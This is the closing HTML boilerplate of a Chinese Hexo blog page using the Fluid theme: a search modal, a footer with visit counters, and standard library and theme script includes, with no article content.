    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>












  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



</body>
</html>
